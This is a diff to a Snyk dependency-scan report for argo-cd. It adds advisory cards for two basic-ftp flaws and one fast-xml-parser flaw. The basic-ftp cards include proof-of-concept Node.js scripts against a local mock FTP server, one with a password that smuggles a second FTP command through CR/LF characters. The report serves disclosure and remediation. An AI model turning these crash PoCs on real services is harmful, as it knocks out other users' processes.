@@ -7,7 +7,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <title>Snyk test report</title>
-  <meta name="description" content="153 known vulnerabilities found in 37760 vulnerable dependency paths.">
+  <meta name="description" content="156 known vulnerabilities found in 37763 vulnerable dependency paths.">
   <base target="_blank">
   <link rel="icon" type="image/png" href="https://res.cloudinary.com/snyk/image/upload/v1468845142/favicon/favicon.png"
     sizes="194x194">
@@ -492,7 +492,7 @@
               <div class="header-wrap">
                   <h1 class="project__header__title">Snyk test report</h1>
     
-                <p class="timestamp">November 8th 2026, 12:30:29 am (UTC+00:00)</p>
+                <p class="timestamp">November 15th 2026, 12:30:08 am (UTC+00:00)</p>
               </div>
               <div class="source-panel">
                 <span>Scanned the following paths:</span>
@@ -506,8 +506,8 @@
               </div>
     
               <div class="meta-counts">
-                <div class="meta-count"><span>153</span> <span>known vulnerabilities</span></div>
-                <div class="meta-count"><span>37760 vulnerable dependency paths</span></div>
+                <div class="meta-count"><span>156</span> <span>known vulnerabilities</span></div>
+                <div class="meta-count"><span>37763 vulnerable dependency paths</span></div>
                 <div class="meta-count"><span>3235</span> <span>dependencies</span></div>
               </div><!-- .meta-counts -->
             </div><!-- .layout-container--short -->
@@ -591247,6 +591247,131 @@
         
         </div><!-- .card -->
         <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Uncaught Exception</h2>
+            <div class="card__section">
+        
+                <div class="card__labels">
+                    <div class="label label--high">
+                        <span class="label__text">high severity</span>
+                    </div>
+                    <div class="label label--exploit">
+                        <span class="label__text">Exploit: Proof of Concept</span>
+                    </div>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Manifest file: /argo-cd <span class="list-paths__item__arrow">›</span> ui-test/yarn.lock
+                    </li>
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            basic-ftp
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    ui-test@1.0.0, chromedriver@136.0.2 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        ui-test@1.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        chromedriver@136.0.2
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        proxy-agent@6.4.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        pac-proxy-agent@7.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        get-uri@6.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        basic-ftp@5.2.0
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.org/package/basic-ftp">basic-ftp</a> is a FTP client for Node.js, supports FTPS over TLS, IPv6, Async/Await, and Typescript.</p>
+        <p>Affected versions of this package are vulnerable to Uncaught Exception via an uncaught exception in <code>FTPContext._passToHandler</code>. <code>Client.login()</code> calls <code>FTPContext.send()</code> from inside the control-socket <code>data</code> event handler, and <code>send()</code> throws when the command contains CR, LF, or NUL. Because the throw originates inside a socket event callback rather than a Promise executor, no try/catch or <code>.catch()</code> in application code can intercept it, and the process terminates with an uncaught exception. The same pattern exists in the REST/RETR path of <code>downloadTo()</code> when the remote path contains control characters. An attacker who controls the FTP password or the remote path of a resumed download can crash the entire Node.js process with a single request, taking down all other clients it serves.</p>
+        <h2 id="poc">PoC</h2>
+        <p>Tested on Node.js v22.22.0 against basic-ftp 6.2.2 (built from source). It uses a minimal mock FTP server on localhost:</p>
+        <pre><code class="language-js">const net = require(&quot;net&quot;)
+        const ftp = require(&quot;basic-ftp&quot;)
+        
+        const srv = net.createServer(s =&gt; {
+          s.write(&quot;220 hi\r\n&quot;)
+          s.on(&quot;data&quot;, d =&gt; {
+            const c = d.toString()
+            if (c.startsWith(&quot;USER&quot;)) s.write(&quot;331 pw\r\n&quot;)
+            else if (c.startsWith(&quot;PASS&quot;)) s.write(&quot;230 ok\r\n&quot;)
+            else s.write(&quot;200 ok\r\n&quot;)
+          })
+        })
+        
+        srv.listen(0, async () =&gt; {
+          const c = new ftp.Client(2000)
+          try {
+            await c.access({
+              host: &quot;127.0.0.1&quot;,
+              port: srv.address().port,
+              user: &quot;bob&quot;,
+              password: &quot;x\r\nDELE important&quot;   // attacker-controlled value
+            })
+          } catch (e) {
+            console.log(&quot;rejected:&quot;, e.message)  // never reached
+          }
+          console.log(&quot;handled gracefully&quot;)      // never reached
+          process.exit(0)
+        })
+        </code></pre>
+        <p>Result: the process terminates with an uncaught exception and neither catch nor the final console.log runs:</p>
+        <pre><code>Error: Invalid command: Contains control characters. (PASS x
+        DELE important)
+            at FTPContext.send (dist/FtpContext.js:189:19)
+            at Object.responseHandler (dist/Client.js:186:26)
+            at FTPContext._passToHandler (dist/FtpContext.js:322:24)
+            at FTPContext._onControlSocketData (dist/FtpContext.js:312:18)
+            at Socket.&lt;anonymous&gt; (dist/FtpContext.js:133:44)
+        </code></pre>
+        <p>The server in the PoC is benign. Any normal FTP server that replies 331 to USER triggers the same crash.</p>
+        <p><strong>Note:</strong> Tested on Node.js v22.22.0 against basic-ftp 6.2.2 built from source, using a minimal mock FTP server on localhost.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>basic-ftp</code> to version 6.2.3 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/patrickjuchli/basic-ftp/security/advisories/GHSA-r4jh-29pc-gfqr">GitHub Advisory</a></li>
+        <li><a href="https://github.com/patrickjuchli/basic-ftp/commit/0495b906bdf891e68806721b07b333dba65ec88e">GitHub Commit</a></li>
+        <li><a href="https://github.com/patrickjuchli/basic-ftp/releases/tag/v6.2.3">GitHub Release</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-BASICFTP-22549672">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
             <h2 class="card__title">HTTP Response Splitting</h2>
             <div class="card__section">
         
@@ -782824,6 +782949,85 @@
         
         </div><!-- .card -->
         <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
+            <h2 class="card__title">Inefficient Algorithmic Complexity</h2>
+            <div class="card__section">
+        
+                <div class="card__labels">
+                    <div class="label label--medium">
+                        <span class="label__text">medium severity</span>
+                    </div>
+                    <div class="label label--exploit">
+                        <span class="label__text">Exploit: Proof of Concept</span>
+                    </div>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Manifest file: /argo-cd <span class="list-paths__item__arrow">›</span> ui/yarn.lock
+                    </li>
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            fast-xml-parser
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    argo-cd-ui@1.0.0, redoc@2.4.0 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        argo-cd-ui@1.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        redoc@2.4.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        openapi-sampler@1.6.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        fast-xml-parser@4.5.6
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.org/package/fast-xml-parser">fast-xml-parser</a> is a Validate XML, Parse XML, Build XML without C/C++ based libraries</p>
+        <p>Affected versions of this package are vulnerable to Inefficient Algorithmic Complexity in the <code>readStopNodeData()</code> function in <code>OrderedObjParser.js</code>. An attacker can block the event loop by supplying XML in which a stop node body contains many <code>&lt;a </code> fragments and no closing <code>&gt;</code>, which makes the function rescan the entire remaining input from every <code>&lt;</code>. This affects only applications that set the non-default <code>stopNodes</code> option to match an element in the parsed document.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>fast-xml-parser</code> to version 5.12.0 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-474x-hrwr-fgx4">GitHub Advisory</a></li>
+        <li><a href="https://github.com/NaturalIntelligence/fast-xml-parser/commit/0c3659348364959da62954b73728fb3bd05ebcb4">GitHub Commit</a></li>
+        <li><a href="https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v5.12.0">GitHub Release</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-FASTXMLPARSER-22409021">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
             <h2 class="card__title">Cross-site Scripting (XSS)</h2>
             <div class="card__section">
         
@@ -783681,6 +783885,249 @@
         
             <div class="cta card__cta">
                 <p><a href="https://snyk.io/vuln/SNYK-JS-BRACEEXPANSION-20244950">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
+            <h2 class="card__title">Prototype Pollution</h2>
+            <div class="card__section">
+        
+                <div class="card__labels">
+                    <div class="label label--medium">
+                        <span class="label__text">medium severity</span>
+                    </div>
+                    <div class="label label--exploit">
+                        <span class="label__text">Exploit: Proof of Concept</span>
+                    </div>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Manifest file: /argo-cd <span class="list-paths__item__arrow">›</span> ui-test/yarn.lock
+                    </li>
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            basic-ftp
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    ui-test@1.0.0, chromedriver@136.0.2 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        ui-test@1.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        chromedriver@136.0.2
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        proxy-agent@6.4.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        pac-proxy-agent@7.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        get-uri@6.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        basic-ftp@5.2.0
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.org/package/basic-ftp">basic-ftp</a> is a FTP client for Node.js, supports FTPS over TLS, IPv6, Async/Await, and Typescript.</p>
+        <p>Affected versions of this package are vulnerable to Prototype Pollution via the <code>parseLine</code> function in <code>src/parseListMLSD.ts</code>, which looks up fact-handler functions in a plain object literal keyed directly by fact names taken from the FTP server&#39;s MLSD directory-listing response without validating that the key is an own property. When a directory-listing line contains the fact name <code>__proto__</code>, the bracket lookup <code>factHandlersByName[&quot;__proto__&quot;]</code> returns <code>Object.prototype</code> itself - a truthy, non-undefined value - bypassing the <code>if (!factHandler)</code> guard and causing the code to throw <code>TypeError: factHandler is not a function</code>. This <code>TypeError</code> is not an <code>FTPError</code>, so it is not caught by <code>Client.list()</code>&#39;s retry logic and propagates as a rejected promise out of <code>list()</code> and every API built on top of it (<code>downloadToDir</code>, <code>uploadFromDir</code>, <code>clearWorkingDir</code>, <code>removeDir</code>), crashing the Node.js process when the rejection is unhandled.</p>
+        <h2 id="poc">PoC</h2>
+        <pre><code class="language-js">Prerequisites: Node.js, a clone/checkout of basic-ftp, `npm install` then `npm run buildOnly` (or `npx tsc`) to produce dist/.
+        
+        Step 1 — Minimal reproduction of the parser bug alone:
+        
+            node -e &#39;
+            const { parseList } = require(&quot;./dist/parseList&quot;);
+            parseList(&quot;__proto__=x;type=file;size=10; evil.txt&quot;);
+            &#39;
+        
+        Expected result:
+            Uncaught TypeError: factHandler is not a function
+                at parseLine (.../dist/parseListMLSD.js:...)
+        
+        Step 2 — End-to-end reproduction through the public Client API, proving a real FTP server can trigger this over the wire with no client modification:
+        
+            Save as poc.js in the repo root and run `node poc.js`:
+        
+            const net = require(&quot;net&quot;)
+            const { Client } = require(&quot;./dist/index&quot;)
+        
+            const server = net.createServer(socket =&gt; {
+                socket.write(&quot;220 fake ftp ready\r\n&quot;)
+                socket.on(&quot;data&quot;, data =&gt; {
+                    const cmd = data.toString().trim()
+                    if (cmd.startsWith(&quot;USER&quot;)) socket.write(&quot;230 ok\r\n&quot;)
+                    else if (cmd.startsWith(&quot;OPTS&quot;) || cmd.startsWith(&quot;TYPE&quot;) ||
+                             cmd.startsWith(&quot;STRU&quot;) || cmd.startsWith(&quot;PBSZ&quot;) ||
+                             cmd.startsWith(&quot;PROT&quot;)) socket.write(&quot;200 ok\r\n&quot;)
+                    else if (cmd.startsWith(&quot;FEAT&quot;)) socket.write(&quot;211-Features\r\n MLST type;size;\r\n211 End\r\n&quot;)
+                    else if (cmd.startsWith(&quot;EPSV&quot;)) {
+                        const dataServer = net.createServer(dsock =&gt; {
+                            // The malicious line: fact name &quot;__proto__&quot;
+                            dsock.end(&quot;__proto__=pwn;type=file;size=4; evil.txt\r\n&quot;)
+                        })
+                        dataServer.listen(0, &quot;127.0.0.1&quot;, () =&gt; {
+                            const p = dataServer.address().port
+                            socket.write(`229 Entering Extended Passive Mode (|||${p}|)\r\n`)
+                        })
+                    }
+                    else if (cmd.startsWith(&quot;MLSD&quot;) || cmd.startsWith(&quot;LIST&quot;)) {
+                        socket.write(&quot;150 Here comes the listing\r\n&quot;)
+                        setTimeout(() =&gt; socket.write(&quot;226 Listing complete\r\n&quot;), 50)
+                    }
+                    else socket.write(&quot;200 ok\r\n&quot;)
+                })
+            })
+        
+            server.listen(2121, &quot;127.0.0.1&quot;, async () =&gt; {
+                const client = new Client()
+                try {
+                    await client.access({ host: &quot;127.0.0.1&quot;, port: 2121, user: &quot;a&quot;, password: &quot;b&quot; })
+                    const files = await client.list()
+                    console.log(&quot;list() returned normally (unexpected):&quot;, files)
+                } catch (err) {
+                    console.log(&quot;client.list() threw:&quot;, err.constructor.name, &quot;-&quot;, err.message)
+                } finally {
+                    client.close()
+                    server.close()
+                    process.exit(0)
+                }
+            })
+        
+        Expected output:
+        
+            client.list() threw: TypeError - factHandler is not a function
+        
+        Configuration notes:
+        - No TLS, auth bypass, or special server config needed — this is a plain FTP (PASV/EPSV
+          text) session using the server&#39;s FEAT response to turn on MLSD, which is the common
+          path for any modern FTP server.
+        - The same crash can be delivered via a LIST-fallback MLSD-shaped line too, since
+          parseList() auto-detects the format from the last listing line.
+        - In a real application without a try/catch around list()/downloadToDir()/
+          clearWorkingDir()/removeDir(), this rejection is unhandled and terminates the
+          Node.js process by default (Node &gt;=15 unhandledRejection behavior is &quot;throw&quot;).
+        </code></pre>
+        <p><strong>Note:</strong> The PoC states it requires Node.js and a local build of basic-ftp (via <code>npm run buildOnly</code> or <code>npx tsc</code>) to produce the <code>dist/</code> directory, with no TLS or special server configuration needed.</p>
+        <h2 id="details">Details</h2>
+        <p>Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as <code>__proto__</code>, <code>constructor</code> and <code>prototype</code>. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the <code>Object.prototype</code> are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.</p>
+        <p>There are two main ways in which the pollution of prototypes occurs:</p>
+        <ul>
+        <li><p>Unsafe <code>Object</code> recursive merge</p>
+        </li>
+        <li><p>Property definition by path</p>
+        </li>
+        </ul>
+        <h3 id="unsafe-object-recursive-merge">Unsafe Object recursive merge</h3>
+        <p>The logic of a vulnerable recursive merge function follows the following high-level model:</p>
+        <pre><code>merge (target, source)
+        
+          foreach property of source
+        
+            if property exists and is an object on both the target and the source
+        
+              merge(target[property], source[property])
+        
+            else
+        
+              target[property] = source[property]
+        </code></pre>
+        <br>  
+        
+        <p>When the source object contains a property named <code>__proto__</code> defined with <code>Object.defineProperty()</code> , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of <code>Object</code> and the source of <code>Object</code> as defined by the attacker. Properties are then copied on the <code>Object</code> prototype.</p>
+        <p>Clone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: <code>merge({},source)</code>.</p>
+        <p><code>lodash</code> and <code>Hoek</code> are examples of libraries susceptible to recursive merge attacks.</p>
+        <h3 id="property-definition-by-path">Property definition by path</h3>
+        <p>There are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: <code>theFunction(object, path, value)</code></p>
+        <p>If the attacker can control the value of “path”, they can set this value to <code>__proto__.myValue</code>. <code>myValue</code> is then assigned to the prototype of the class of the object.</p>
+        <h2 id="types-of-attacks">Types of attacks</h2>
+        <p>There are a few methods by which Prototype Pollution can be manipulated:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Type</th>
+        <th>Origin</th>
+        <th>Short description</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td><strong>Denial of service (DoS)</strong></td>
+        <td>Client</td>
+        <td>This is the most likely attack. <br>DoS occurs when <code>Object</code> holds generic functions that are implicitly called for various operations (for example, <code>toString</code> and <code>valueOf</code>). <br> The attacker pollutes <code>Object.prototype.someattr</code> and alters its state to an unexpected value such as <code>Int</code> or <code>Object</code>. In this case, the code fails and is likely to cause a denial of service.  <br><strong>For example:</strong> if an attacker pollutes <code>Object.prototype.toString</code> by defining it as an integer, if the codebase at any point was reliant on <code>someobject.toString()</code> it would fail.</td>
+        </tr>
+        <tr>
+        <td><strong>Remote Code Execution</strong></td>
+        <td>Client</td>
+        <td>Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br><strong>For example:</strong> <code>eval(someobject.someattr)</code>. In this case, if the attacker pollutes <code>Object.prototype.someattr</code> they are likely to be able to leverage this in order to execute code.</td>
+        </tr>
+        <tr>
+        <td><strong>Property Injection</strong></td>
+        <td>Client</td>
+        <td>The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  <strong>For example:</strong> if a codebase checks privileges for <code>someuser.isAdmin</code>, then when the attacker pollutes <code>Object.prototype.isAdmin</code> and sets it to equal <code>true</code>, they can then achieve admin privileges.</td>
+        </tr>
+        </tbody></table>
+        <h2 id="affected-environments">Affected environments</h2>
+        <p>The following environments are susceptible to a Prototype Pollution attack:</p>
+        <ul>
+        <li><p>Application server</p>
+        </li>
+        <li><p>Web server</p>
+        </li>
+        <li><p>Web browser</p>
+        </li>
+        </ul>
+        <h2 id="how-to-prevent">How to prevent</h2>
+        <ol>
+        <li><p>Freeze the prototype— use <code>Object.freeze (Object.prototype)</code>.</p>
+        </li>
+        <li><p>Require schema validation of JSON input.</p>
+        </li>
+        <li><p>Avoid using unsafe recursive merge functions.</p>
+        </li>
+        <li><p>Consider using objects without prototypes (for example, <code>Object.create(null)</code>), breaking the prototype chain and preventing pollution.</p>
+        </li>
+        <li><p>As a best practice use <code>Map</code> instead of <code>Object</code>.</p>
+        </li>
+        </ol>
+        <h3 id="for-more-information-on-this-vulnerability-type">For more information on this vulnerability type:</h3>
+        <p><a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf">Arteau, Olivier. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018</a></p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>basic-ftp</code> to version 6.2.4 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/patrickjuchli/basic-ftp/security/advisories/GHSA-5pm8-86m8-9m6r">GitHub Advisory</a></li>
+        <li><a href="https://github.com/patrickjuchli/basic-ftp/commit/a22664a45d889f7d281e5bdd212c68c0a58d0ae6">GitHub Commit</a></li>
+        <li><a href="https://github.com/patrickjuchli/basic-ftp/releases/tag/v6.2.4">GitHub Release</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-BASICFTP-22549670">More about this vulnerability</a></p>
             </div>
         
         </div><!-- .card -->
